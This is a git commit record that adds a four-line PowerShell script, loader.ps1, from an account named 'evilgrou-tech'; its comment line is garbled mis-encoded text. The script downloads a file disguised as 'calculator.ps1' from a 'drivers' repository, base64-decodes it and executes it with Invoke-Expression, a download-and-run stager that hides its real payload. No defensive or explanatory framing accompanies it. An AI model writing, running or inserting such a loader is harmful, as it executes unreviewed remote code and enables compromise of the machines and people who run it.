db76679276dde5e08d2c626fed816b5a43664625
evilgrou-tech <evilgrou@gmail.com>
2026-02-16 13:04:31 +0300

    Add files via upload

---
+++ loader.ps1
@@ -0,0 +1,4 @@
+# loader.ps1 ≈ ецн ме фюкйн, нм мхвецн ме слеер
+$e = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/evilgrou-tech/drivers/refs/heads/main/calculator.ps1');
+$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e));
+Invoke-Expression $d
